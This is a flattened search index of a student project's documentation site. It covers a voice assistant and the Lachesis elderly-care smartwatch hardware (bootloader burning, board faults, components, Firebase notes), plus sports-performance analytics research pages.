file[model_name]_intents.pkl - A serialized byte stream of the intents object structure.[model_name]_words.pkl - A serialized byte stream of the bag-of-words object structure the model was trained on.  ","version":"Next","tagName":"h3"},{"title":"Future Plans​","type":1,"pageTitle":"Voice Assistant feature for Elderly Care Wearable.","url":"/redback-documentation/docs/project-2/Data Science and Analytics/VoiceAssisstant#future-plans","content":" Broaden scope of the voice assistants subject matterSupport more languages / multilingualismBuild compatability with emerging health care technologiesImplementation into the wearable.  ","version":"Next","tagName":"h2"},{"title":"Local Development​","type":1,"pageTitle":"Voice Assistant feature for Elderly Care Wearable.","url":"/redback-documentation/docs/project-2/Data Science and Analytics/VoiceAssisstant#local-development","content":" To run the project on a local machine, follow these steps:  Clone the repository from GitHubNavigate to the Voice Assistant directoryInstall the required dependencies using pip install -r docs/requirements.txtUse the code in neural_intents_code/assistants.py to update the neuralintents library code. NOTE: This step is required as for this feature, parts of the neuralintents&gt;assistants.py code are updated.To retrain a model, run the train_model.py scriptRun the main.py script to start the voice assistant feature  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan ","version":"Next","tagName":"h2"},{"title":"Burning of the bootloader","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Device Design/Board_Init","content":"","keywords":"","version":"Next"},{"title":"Background​","type":1,"pageTitle":"Burning of the bootloader","url":"/redback-documentation/docs/project-2/Device Design/Board_Init#background","content":" A freshly fabricated PCB will not have any code on it (unless you know to ask and pay extra for the privilege). This includes the code that explains to the device how to communicate over USB. So how do you teach a USB device to be a USB device without using USB?  Enter test pads. These pads are often included in PCB designs to test for hardware faults like misplaced or defective components on a board. They are also used for directly interfacing with a device for hardware debugging.  In this case we want to use them to communicate with the board following a version of these instructions but in our case, we need to do some prep work to ensure a solid connection because the layout is jank. We could directly solder jumper wires to the pads, but they are small and essentially just copper foil on fibreglass and if the foil peels of then there is no coming back from it (40 bucks wasted on an Arduino to confirm).  Instead, a jig was fabricated that will allow for spring / 'pogo' pins, to make and maintain contact with the test pads.  The vector file in the CAD_Designs/Bootloader_Jig should be importable to your laser cutter control software of choice. The Hackerspace I did this at (Connected Community Hackerspace) uses lightburn, so I also included my project file if you ever need to make another one. Once with the 5 holes in the center (Call this Piece A) and once without (Piece B). You may also want to use that tiny hole pattern in the center to make a &quot;shoe&quot; to catch the backs of the poho pins The Blue square represents an etch-layer and this can be used to ensure that its oriented correctly.  ","version":"Next","tagName":"h2"},{"title":"Assembly​","type":1,"pageTitle":"Burning of the bootloader","url":"/redback-documentation/docs/project-2/Device Design/Board_Init#assembly","content":" Piece B: On the side with the etched face, Insert 4 M3 bolts in the cutout. Screw nuts onto the opposite side to finger tight.Piece A: Insert the pogo pins (A baggy of ~100 has been left in the project box) into the non-etched side of the cutout. The pin heads shouldn't be able to fit through the holes.Piece A: Using M2 nuts and bolts, attach the bottom of the board to the cutout using the threaded holes included for the display. Alignment can be guranteed by lining up the bottom of the rotary encoder with the etch square, with the etch itself on the non contacting face.You should now be able to slide Piece A onto the bolts of Piece B and tighten them down. Don't press down too much, we just want to make sure that there is a solid contact between the test pads and the pogo pins.  ","version":"Next","tagName":"h2"},{"title":"Burn Baby Burn​","type":1,"pageTitle":"Burning of the bootloader","url":"/redback-documentation/docs/project-2/Device Design/Board_Init#burn-baby-burn","content":" With the jig assmbled you're free to follow the instructions provided by Arduino for burning the bootloader. I made some spring hook hookup wires that can connect onto the exposed pogos and plug into your debugger. I didn't want to buy another hardware debugger and discovered that my Flipper Zero could act as a bridge, so I just used that with the DAP-LINK application (Included in most of the unofficial firmwares and stand alone in the flipper lab). Apparently you can also use a Raspberry Pi pico with blue tag. (Good watch if interested in Hardware and or reverse engineering)  If you do decide to buy a debugger (They're cheap I just didn't want to wait nor the clutter) Make sure it supports CMSIS-DAP`. A regular SWD/JTAG debugger won't work.  info Document Creation: 15 December 2024. Last Edited: 15 December 2024. Authors: Lachlan Costigan ","version":"Next","tagName":"h2"},{"title":"Board Validation Testing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown","content":"","keywords":"","version":"Next"},{"title":"1. It will literally burn you​","type":1,"pageTitle":"Board Validation Testing","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown#1-it-will-literally-burn-you","content":" In each example provided in the datasheet of the TMP36 a 100nF capacitor is placed in front of the Vin pin.  This was omitted from the PCB design.    I believe this is why after about 10 seconds of being plugged in, the sensor becomes too hot to touch. This may also be compounding other issues noted below.  ","version":"Next","tagName":"h2"},{"title":"2. No power over USB​","type":1,"pageTitle":"Board Validation Testing","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown#2-no-power-over-usb","content":" The board is only able to receive power via the LiPo JST connectors. Therefore, when attempting to verify that my bootloader burn worked I was a bit confused as to why after seemingly successfully completing it according to the terminal output, I saw no communication between Lachesis and my computer. After some time of steam coming out of my ears pop-eye style I remembered that in T2 I noticed that the board didn't have a charging circuit included for the LiPos to be able to charge over USB. We bought some tiny usb LiPo mediator chips from Core-Electronics to bodge it and I spent a considerable amount of time trying to hack it in but to no avail.  Therefore, if you want to program the board, you need to be draining the battery. Or at least you would if it weren't for...  ","version":"Next","tagName":"h2"},{"title":"3. Serial Communications dies after roughly 3 minutes​","type":1,"pageTitle":"Board Validation Testing","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown#3-serial-communications-dies-after-roughly-3-minutes","content":" I don't understand why but after performing the ritual to interface with the board, I found that I kept losing the COM port. I did a few tests and found that it pretty consistently turns off after around 2 minutes and 45 seconds and if you do it in quick succession, the time before comms are lost is lessened. This leads me to believe that the heat from the temperature sensor (which is located next to the USB socket by the by) is increasing the resistance of the traces to the point where not enough current is available to maintain the connection.  ","version":"Next","tagName":"h2"},{"title":"4. The processor is too weak and too expensive​","type":1,"pageTitle":"Board Validation Testing","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown#4-the-processor-is-too-weak-and-too-expensive","content":" It can barely run the display by itself. It will probably struggle trying to run both at the same time but when I went to test it I cracked the screen because it turns out the displays don't have caps at the end of the threads either (I ordered replacements)  ","version":"Next","tagName":"h2"},{"title":"Design Flaws​","type":1,"pageTitle":"Board Validation Testing","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown#design-flaws","content":" These aren't necessarily dealbreakers, but they are still gripes  The wearable looks more like a house arrest ankle monitor than a smartwatchIn an effort to minimise the ankle monitor vibe, I was trying to keep the case as compact as possible. However, some layout decisions made that a fool's errand, namely internal interfaces (the JST plugs to the batteries) share a wall with the small hardware switch which must be accessible to turn the board on. This means that unless the case sticks out a bit to provide a channel for the power cable to run through, the cables have to stick out the side and feed back into the watch. The edge with the push button and USB plug has the EXACT same issue. I tried to leave it with the librarian because I was working late to get it ready for innofes and didn't think I'd be able to wake up early enough to hand it to Manan and the librarian / security flat out refused because it &quot;Looks sketchy as hell&quot;  ","version":"Next","tagName":"h2"},{"title":"Advice / Ways forward​","type":1,"pageTitle":"Board Validation Testing","url":"/redback-documentation/docs/project-2/Device Design/Board_shakedown#advice--ways-forward","content":" Fix the Board. This is probably a non-starter because we don't even have the source files for the device PCB. I've found the problems that make this a pain to deal and identified the issues. Specifically: Add the 0.1 μF capacitorEmbed the makerverse 3.3v battery charger module into the design. Incorporate the USB V+ line of the micro USB New Version My biased opinion is that this is the best way forward. The challenge of hardware design is still present as are the risks, but I believe that if the design philosophy pivots toward making a sensor shield for an off the shelf display with an embedded microcontroller, we can maintain the prestige of making custom hardware while avoiding the pitfalls of the previous iteration. It also affords the opportunity for a cheaper and more modular design. I'm toying with this idea for practice / fun using a waveshare display with an embedded RP2040 and if successful I'll document the design and leave it in the Redback Locker for you to continue work on. If custom hardware is to be designed and fabricated by the university please get it checked by someone with experience manufacturing custom PCBs. The mechatronics course has a PCB Fab Lab which so far as I can tell doesn't have the capability to do custom SMT level boards but at least they'll be able to tell you if you've made an obvious mistake. Pivot the project to a Consumer Smartwatch App Considering the relative lack of popularity of IoT as a discipline compared to Data Science, Security and Software Development, as well as the amount of stuff outside the of the scope of the course required to fabricate hardware, it may be worth considering the project pivot toward taking a consumer smartwatch and developing an app based on the wearable version of a mobile operating systems. The advantage here would be it might be quicker to get people making technical contributions and the hardware is known to work and will be more sophisticated from a technical point of view, and the fact that the hardware / embedded specialist(s) spend a trimester learning the project and a trimester working on it only to leave will be less of an issue. The downside is that the project will be limited to the sensor apparatus that Apple, Google, Samsung, etc. deem consumers want, rather than catered to the data capture work that would be beneficial to the project.  Ultimately, you should collectively make the call based on the talents available to you as well as the expected talents of those that come after you. In my experience we had 3 people (2 Sr, 1 Jr) in the IoT team in T2-24 and 2 people in T3-24 (1 Sr, 1 Jr).  info Document Creation: 15 December 2024. Last Edited: 08 January 2025. Authors: Lachlan Costigan ","version":"Next","tagName":"h2"},{"title":"Components","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Device Design/Components","content":"","keywords":"","version":"Next"},{"title":"Microcontroller​","type":1,"pageTitle":"Components","url":"/redback-documentation/docs/project-2/Device Design/Components#microcontroller","content":" ","version":"Next","tagName":"h2"},{"title":"Arduino Nano 33 IoT​","type":1,"pageTitle":"Components","url":"/redback-documentation/docs/project-2/Device Design/Components#arduino-nano-33-iot","content":"  This is a very capable little board that was selected to be the main processor.  Its processor is an ARM Cortex M0+ with up to 48MHz, a separate processor to handle wireless communications in the u-blox NINA W102, In-built accelerometer, 12 digital and 8 analogue I/O pins1.    This board has been incorporated as the basis for our PCB.  ","version":"Next","tagName":"h3"},{"title":"Sensors​","type":1,"pageTitle":"Components","url":"/redback-documentation/docs/project-2/Device Design/Components#sensors","content":" Each of our sensors were selected with consideration for their application to our target userbase, I/O constraints and our requirement that everything on the board runs off 3.3 Volts.  Heart Rate, Pulse Oximeter​ We're using a MAX30102 as the basis of our heart rate and oxygen saturation sensor. It communicates over I2C meaning relatively efficient use of out limited I/O, and is used in many similar products. This module will be encorporated into the Watches strap for accurate readings from the underside of the wrist Temperature Sensor​ Temperature is provided via a TMP36. It has a nominal scale factor ~ 10 mV/°C , accurate to ±2°C from between -40°C to +125°C Gas, Pressure, Humidity​ Provided by a Bosch BME680. This sensor is relatively accurate across its 3 domains. It even includes a temperature measurement but we opted for the TMP36 as it is more accurate and in this chip its really just used to calculate compensations for pressure sensing. It has support for I2C and SPI protocols. Flame​ The flame sensor is a YG1006 PhotoTransistor. It has a spectral bandwidth of 760nm - 1100nm which is ideal for the infrared light given by flames but also may be triggered by tv remotes or other household IR sources. We will overcome this by implementing a sliding window on the input signal.  ","version":"Next","tagName":"h2"},{"title":"User Interaction​","type":1,"pageTitle":"Components","url":"/redback-documentation/docs/project-2/Device Design/Components#user-interaction","content":" With consideration of our target users, we opted to have a tactile interface rather than a touch screen. Our display is a 1.69&quot; Waveshare LCD as it met the requirement of being powered off 3.3V and controllable via the SPI protocol. It is 240px x 280px and easily programmable via waveshare's official libraries.  Audio Feedback is provided via a simple buzzer.  Input is handled by 2 Mini Push button Switches and a Bourns PEC12R Rotary Encoder  ","version":"Next","tagName":"h2"},{"title":"Power​","type":1,"pageTitle":"Components","url":"/redback-documentation/docs/project-2/Device Design/Components#power","content":" We included 2x 1100mAh 3.7V LiPo Batteries to drive the board but failed to consider the charging circuit on the PCB. As a hacked together solution, we will be using an off the shelf USB-C - LiPO Charger to ensure that the device can be powered.  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan    Footnotes​ Full specs available on the Arduino product page ↩ ","version":"Next","tagName":"h2"},{"title":"Firebase overview","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Device Design/Firebase","content":"Last updated by: Lachlan, Last updated on: '17/12/2024' Last updated by: Lachlan, Last updated on: '17/12/2024' Firebase overview warning As of T3-24 firebase connectivity must be reimplemented if it is to be used at all. There was some discussion with the data warehouse team about them setting up an API to pipe data from the device securely but that got upended by both parties becoming busy with other problems. For our project we are using Firebase for the data storage, currently we are using a Realtime database which will have to be replaced moving forward. I have provided a video link that contains just the basic info on our databse such as the the login id and passwords to use firebase.https://youtu.be/vET7iuKpOCc info Document Creation: 23 September, 2024. Last Edited: 15 December 2024. Authors: Vishal Pranau.updated by: Lachlan Costigan","keywords":"","version":"Next"},{"title":"Lachesis Hardware","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device","content":"","keywords":"","version":"Next"},{"title":"Background/Objective​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#backgroundobjective","content":" Lachesis (Lak-iss-iss) is the middle sister of the three Moirai whose role is the alotter / measurer of each person's life and destiny. We thought the name was apt as this device is ostensibly attempting to provide real-time predictions about potentially life altering ailments.  The smartwatch aspect of this project will be the primary physical interface between our users and the work that has been conducted between each of our project teams. It is a bespoke design to facilitate the capture of data of interest to our Predictive Modelling and Analytics teams while also designed with the aim of providing a feature set that will encourage our users to actively engage with the device.  When designing the hardware we've had to balance the considerations between our data team and our end user. These considerations have included the physical interface of the device, where we've noted that the elderly tend to be averse to touch interfaces and have opted for our primary navigation to be tactile and mechanical using buttons and a wheel. The implemented sensor array has been selected primarily based on the requirements of the data analytics teams and with consideration to data that may be useful to them that isn't necessarily available on existing smart-watches.  ","version":"Next","tagName":"h2"},{"title":"Getting Started​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#getting-started","content":" In the interest of making this as accessible to the developer as it is to the user, we have opted to base our device on the Arduino Nano IoT 33. This means that coding for the device is pretty simple, barring some quirks outlined in the notes from the board evaluation.  You can even use the Arduino IDE. And we did for a while but that lead to some shoddy code practices and massive inconvenience, so we've started a major code refactor using the PlatformIO framework.  Doing so gives easy organisation, dependency management, unit testing and support for many more boards in case it is decided to use a processor with more oomph down the line. The only thing to really note if you are only used to Arduino IDE is that instead of programming in an Arduino abstraction of C++, you're programming in a C++ file that includes the Arduino Library.  i.e.#include &lt;Arduino.h&gt;  If you're very proficient you can do away with Arduino altogether and start using Zephyr RTOS as the platform, but that will probably require another major code refactor so only do it if you feel confident that you can reimplement the existing codebase and more importantly, document it for future students  With a way to work on the codebase now installed and configured, you may find the device software under ./Codebase/Complete_Code/  warning Please ensure that any API keys in use are added to secrets.h and that it is still present in.gitignore  Work on the Prototype 2 PCB was conducted in Altium Designer however the source files were not added to the repo by the designer can be imported into KiCAD.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#prerequisites","content":" You can install the PlatformIO extension in VS Code (recommended) or any of the other text editors listed hereOnce the extension is installed simply use it to open the project folder, and it will automatically retrieve the required libraries outlined in the platformio.ini  The packages below are listed for posterity because while you don't have to go through the trouble of manually installing them anymore, they generally also have references to each library's documentation.  SPI.h - Built into Arduino. Enables communication with the Serial Peripheral Interface Protocol. WiFiNINA.h - Available through the Library Manager and on GitHub. Allows using the WiFiNINA module to perform wireless tasks. Adafruit_Sensor.h - Available through the Library Manager and on GitHub. Prerequisite Framework for other Adafruit Libraries. Adafruit_GFX.h - Available through the Library Manager and on GitHub. Core graphics library for Adafruit displays. Wire.h - Available through the Library Manager. Enables communication with the I2C protocol. Adafruit_BME680.h - Available through the Library Manager and on GitHub. Library for the Temperature, Pressure, Humidity and Gas Sensor. Arduino_LSM6DS3.h - Available through the Library Manager. Library for the Nano IoT 33's Inbuilt Accelerometer, Gyroscope and Temperature Sensor. RTCZero.h - Available through the Library Manager. Permits RTC functions. WiFiUDP.h - Available through the Library Manager. Library for UDP packet Tx / Rx. DFRobot_MAX30102 Library for the Heart-Rate and Oximeter Sensor.To Install, download the library from the repo and save in your \\Arduino\\libraries directory. ThingSpeak Communications library for writing to the ThingSpeak API endpoints. This is no longer being used due to data privacy concerns.Get in touch with the data warehouse team because requirements have been established for capturing data and storing it in a secured Uni system however that got backburnered due to more pressing issues    ","version":"Next","tagName":"h2"},{"title":"Installation​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#installation","content":" A fresh from the fab Mk2 PCB will require the burning of a bootloader before it can be programmed over USB Detailed overview of this process is available in the Board Bootloader page but for a quick overview check out the official Arduino pageNotes:  I used a Flipper Zero with the DAP link community app because all the JTAG debuggers available to me did not support CMSIS-DAP / SWD (but I was just pilfering the old stuff from the hacker space so go figure) and I came across this video which instantly cured my Kickstarter backer buyer's remorse. It's a very interesting watch if you want to learn about debug interfaces.Just make sure that whatever you're using works over 3.3V, or you'll probably fry the PCB  ","version":"Next","tagName":"h2"},{"title":"Folder Structure​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#folder-structure","content":" The folder structure compartmentalizes the three aspects of our hardware repository,  CAD_Designs Contain the designs for our case and custom PCB Codebase Contains the functioning code in Complete Code as well as experiments, examples and archived efforts in their respective folders. Documentation Contains written and visual deliverables, research notes, data sheets and guides. More yet to come.  . ├── CAD_Designs │ ├── Case │ └── PCB ├── Codebase │ ├── Archive │ ├── Complete_Code │ ├── Example_Code │ └── Experiments └── Documentation ├── DataSheets ├── Figures ├── ReleaseForms └── Videos   ","version":"Next","tagName":"h2"},{"title":"Project Status​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#project-status","content":" T3-24 was spent attempting to bring the board to an operational state and while it technically is, it is mired with issues which are outlined on the Board Shakedown PageDue to the time spent trying to resolve these issues, the Code refactor isn't up to feature parity with the previous breadboard based prototype and assuming that the board isn't written off, work will need to be done to bring it back up to scratch.  Work has begun on a helper library for the new WaveShare display as writing arbitrary elements to the screen is somewhat cumbersome. This venture is being led by Marcel Rumy who has taken the extension and will hopefully have more to say about it in January.  ","version":"Next","tagName":"h2"},{"title":"Future Considerations​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#future-considerations","content":" We've reached the limit of the Arduino IoT Nano 33's available I/O and so any further additions will require either clever hacks to consolidate the I/O or migration to a new base Microcontroller. This was perhaps the prime motivator behind the migration to PlatformIO, but all the previously noted features are definitely a factor.  Considering the difficulty involved in hardware manufacture and the issues outlined in the hand-over document, it might even be worth pivoting the project to an off the shelf smartwatch and writing an app for it to integrate with the other aspects of the project. This decision will be left in your hands dear reader as I have no idea what sort of talents will be available to you.  ","version":"Next","tagName":"h2"},{"title":"Compliance and Safety​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#compliance-and-safety","content":" As this is a data collection platform targeting health data in particular, it is paramount that any subjects who have their data captured provide informed consent to the data capture. Anyone working on this must complete and understand the Redback ethics and security module to understand their responsibilities.  danger An issue noted during shakedown testing is that due to a fault in the hardware design, the TMP36 temperature sensor becomes untouchably hot after a very short time of the board being powered. If the board is not decommissioned due to this issue alone, please be wary  It was mentioned above however it bares repeating: Credentials and Secrets such as API_Keys are scraped from public repos constantly. Please make use of the secrets.h file for Wi-Fi credentials, user accounts and API keys and add it to your .gitignore. Failure to do so will be grumbled at and subsequently mocked.  ","version":"Next","tagName":"h2"},{"title":"License​","type":1,"pageTitle":"Lachesis Hardware","url":"/redback-documentation/docs/project-2/Device Design/Wearable_device#license","content":" The Hardware of this project is bound under the terms of a Creative Commons Noncommercial Sharealike 4.0 license inherited from the Arduino Nano 33 IoT it is based on. The software is bound under GPLv3. The Data sheets are the property of their relevant authors and are only provided here for reference. Written Artifacts, reports and visual media are TBD  info Document Creation: 05 September 2024. Last Edited: 08 January 2025. Authors: Lachlan Costigan ","version":"Next","tagName":"h2"},{"title":"Research and documentation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/research/","content":"Last updated by: brendankntb, Last updated on: '31/03/2024' Last updated by: brendankntb, Last updated on: '31/03/2024' Research and documentation This area contains the research findings and other documentation for the Sports Performance Analysis project for T3 2023. Cycling Data Description At this stage, this document only explores that data available in the “new Cyclist data.csv” file available from the T2 GitHub repository as we have not yet received Google Big Query access and therefore cannot yet explore the entire available dataset. This document explores the cycling data available with the focus on how the data can be used for building predictive ML models. Strava Bulk Export Data Description This document explains the origin of the Strava data used in the Cycling analysis sub-project which was obtained through a bulk export of a team members workout data. The data contained details for multiple sports but the cycling data can be separated for analysis as part of this project. This document describes the cycling data available with the focus on how the data can be used for building predictive ML models. Heart Rate Zones This document provides information on heart rate zones to support sports performance analysis. Heart Rate Zones​ Heart rate zones are ranges of the heart which, usually expressed as a percentage of your maximum heart rate, that correspond to different levels of exercise intensity. These ranges are used to guide training and exercise intensity for various fitness goals. Heart rate ranges are generally classified into the following zones. Sports Performance Overview The purpose of this document is to provide a snapshot of all the Sports Performance analyses and capture the key objectives. Overall Objective​ The Sports Performance Analysis project aims to deliver comprehensive analysis in various sports, leveraging both real-time and historical data. This project encompasses two main areas: predictive analytics and data visualisation. Developing ML Models for Football Prediction Football Game Outcome Prediction Analysis Introduction​ Welcome to the Football Game Outcome Prediction Analysis Confluence page! This project aims to predict the outcomes of football games, specifically focusing on the Premier League games that occurred during the 2022-23 season. The predictive models are built using a dataset publicly available on Football-Data.co.uk. Web Scraping in Python Introduction​ Web scraping is a powerful technique used to extract data from websites, providing valuable information. It involves using software tools to navigate and interact with web pages, download and parse HTML, and extract relevant information. Web scraping allows users to gather data from various online sources, transforming unstructured web data into a structured format that can be analyzed, stored, or used for various applications. However, it's important to note that web scraping should be performed ethically and in compliance with the terms of service of the websites being accessed. Power BI &amp; GitHub Integration Introduction​ Power BI and GitHub are powerful tools in data analysis and software development, respectively. Integrating Power BI with GitHub allows users to visualise and analyse data hosted on GitHub repositories. The primary advantage of this integration is the seamless update process. Any modifications made to the data in GitHub are easily synchronised with the Power BI dashboard, eliminating the need to establish a new connection for each update. Functional Threshold Power Introduction If you're interested in developing tools to assist cyclists in improving their performance, you've likely come across the term &quot;FTP&quot; or Functional Threshold Power. FTP is a pivotal metric within the cycling community that allows you to assess a cyclist's fitness level, establish accurate training zones, and create tools tailored to enhancing their strength and efficiency. Understanding FTP is crucial when building effective resources for cyclists looking to excel in their sport. Cycling duration prediction models A number of experiments were performed to test prediction models for duration of a workout based upon previous workout details. These experiments can been seen in the Python Notebook in the Project GitHub repository. Data Loading and Preprocessing: The notebook starts with loading cycling data that has been exported from Strava and that contains numerous attributes like distance, speed, heart rate, power, etc. Cycling FTP prediction models A number of experiments were performed to test prediction models for duration of a workout based upon previous workout details. These experiments can been seen in the Python Notebook in the Project GitHub repository. FTP is a critical performance metric in cycling, indicating the highest power a rider can sustain for an hour. Power BI &amp; Python Integration Introduction​ This guide is designed to walk you through the process of integrating Python into Power BI, a synergy that unlocks a new realm of possibilities for data analysis and business intelligence. Prerequisites​","keywords":"","version":"Next"},{"title":"Integration of Data and Models","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/integration-of-data","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#overview","content":" To facilitate the understanding and integration of the collected data and data models into your web development project, let's break down the insights and actionable strategies into several key areas. This report aims to provide clarity on the nature of the collected data, the purpose of the data models, and how these can be integrated into your web platform, with a focus on interactive data visualization, user interface design, and real-time data interaction.  ","version":"Next","tagName":"h3"},{"title":"Overview of Collected Data​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#overview-of-collected-data","content":" The provided datasets and models revolve around cycling activities, encompassing metrics such as power curves, FTP (Functional Threshold Power), duration, and possibly other performance indicators. This kind of data is crucial for athletes, coaches, and enthusiasts looking to analyze performance, track improvements, and set training goals.  ","version":"Next","tagName":"h2"},{"title":"Key Data Points:​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#key-data-points","content":" Activities Data: Includes metrics from cycling activities, such as distance, speed, elevation gain, heart rate, power output, and duration. User Data: Information about users who have performed these activities, which could include age, weight, fitness level, and historical performance data. Performance Metrics: Data related to specific performance insights, such as FTP, which is a critical metric for endurance cyclists, and power curves that display a cyclist's power output over different durations.  ","version":"Next","tagName":"h3"},{"title":"Data Models and Analysis​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#data-models-and-analysis","content":" The Python scripts and Jupyter notebooks contain logic for analyzing the cycling data, including:  Power Curve Analysis: To understand a cyclist's performance capabilities over varying time periods. FTP Prediction: Models to predict a cyclist's FTP based on historical performance data. Performance Visualizations: Notebooks that generate visualizations of power curves, FTP over time, and other performance metrics. Predictive Models: For predicting performance metrics like activity duration or improvements in FTP over time.  ","version":"Next","tagName":"h2"},{"title":"Integration into Web Development Strategy​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#integration-into-web-development-strategy","content":" ","version":"Next","tagName":"h2"},{"title":"1. Interactive Data Visualization​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#1interactive-data-visualization","content":" Tool Selection: Utilize JavaScript libraries such as D3.js for dynamic, interactive visualizations, or higher-level libraries like Chart.js for simpler, yet effective charts. Power Curve Visualizations: Implement interactive charts that allow users to visualize their power curve over time, compare it against past performances, or benchmark against other users. FTP Trends: Design an interactive dashboard where users can view their FTP progress over time, predict future performance, and set goals.  ","version":"Next","tagName":"h3"},{"title":"2. User Interface Design​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#2user-interface-design","content":" Responsive Design: Ensure that the visualization dashboard is responsive and accessible across devices, optimizing for mobile users given the on-the-go nature of cycling enthusiasts. User-Centric Layout: Organize the user interface to focus on key metrics (e.g., FTP, power curves) with the ability to drill down into more detailed data as needed. Use clear, non-technical language and visual cues to guide users through their data.  Real-Time Data Interaction  WebSockets for Live Data: Implement WebSockets to provide users with the ability to see real-time updates to their performance data, especially useful during live tracking of activities. User Data Customization: Allow users to customize what data they wish to see and how it's presented, giving them control over their dashboard and insights.  ","version":"Next","tagName":"h3"},{"title":"Enhanced Features for Improved User Experience​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#enhanced-features-for-improved-user-experience","content":" ","version":"Next","tagName":"h2"},{"title":"Custom Dashboard​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#custom-dashboard","content":" Goal Setting and Monitoring: Implement a feature allowing athletes to set specific training goals (e.g., increasing FTP, preparing for a race) and track their progress over time. This could include customizable widgets on the dashboard for setting milestones, visual progress indicators, and predictive analytics to estimate goal achievement dates. Performance Analysis Over Time: Enhance the dashboard to offer deeper insights into performance trends over selectable time periods. Include options for users to analyze various metrics such as average power output, heart rate zones, and recovery times to tailor their training effectively.  ","version":"Next","tagName":"h3"},{"title":"Scenario Simulation Tools​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#scenario-simulation-tools","content":" Training Scenario Simulations: Develop an interactive tool that allows users to simulate different training scenarios and their potential impacts on performance metrics like FTP. This could factor in variables such as training intensity, frequency, rest periods, and nutrition. Insightful Predictions: Offer predictive insights based on the simulation outcomes, helping athletes understand the potential gains from adjusting their training plans or strategies, thus enabling more informed decision-making.  ","version":"Next","tagName":"h3"},{"title":"Community and Sharing Features​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#community-and-sharing-features","content":" Social Engagement: Create a platform feature for community engagement, allowing users to connect, share their training progress, and celebrate achievements. This can include sharing capabilities for social media, in-app messaging, and community leaderboards. Group Activities and Challenges: Implement functionality for users to create or join group workouts, challenges, and virtual races, fostering a sense of community and shared purpose among athletes.  ","version":"Next","tagName":"h3"},{"title":"Comparative Analysis and Learning from TrainerRoad​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#comparative-analysis-and-learning-from-trainerroad","content":" ","version":"Next","tagName":"h2"},{"title":"Focus on Structured Training​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#focus-on-structured-training","content":" Our platform should prioritize offering structured, comprehensive training plans that are customizable to the goals and levels of individual users, similar to TrainerRoad's approach. This includes analytics-driven training sessions, tapering strategies for race preparation, and recovery advice tailored to cycling and triathlon disciplines.  ","version":"Next","tagName":"h3"},{"title":"User Experience​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#user-experience","content":" Intuitive Interface: Emphasize a clean, intuitive user interface that provides a seamless experience across different devices, drawing inspiration from TrainerRoad. Ensure that navigation is straightforward, with easy access to key features like training plans, data analysis, and community forums. Data Visualization: Prioritize high-quality, interactive data visualizations to help users easily understand their performance metrics and training progress. Utilize graphical representations, progress bars, and color-coded metrics to enhance readability and engagement.  ","version":"Next","tagName":"h3"},{"title":"Community Engagement​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#community-engagement","content":" Inclusive Community Features: Beyond forums and group workouts, consider incorporating features like shared training plans, mentorship programs, and community challenges to enhance engagement. These elements can motivate users, foster a sense of belonging, and encourage consistent platform use. Sharing and Motivation: Leverage social sharing and motivational features to keep users engaged and motivated. This could include achievement badges, weekly leaderboards, and customizable post-workout sharing templates to celebrate milestones and daily achievements on social media.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Integration of Data and Models","url":"/redback-documentation/docs/project-3/integration-of-data#conclusion","content":" By integrating enhanced features focused on customization, simulation, and community, alongside adopting best practices from platforms like TrainerRoad, we can significantly improve user engagement and satisfaction. These strategies aim not only to enhance the individual training experience but also to build a vibrant, supportive community around our platform. The next steps involve detailed planning and development phases to bring these features to life, ensuring we 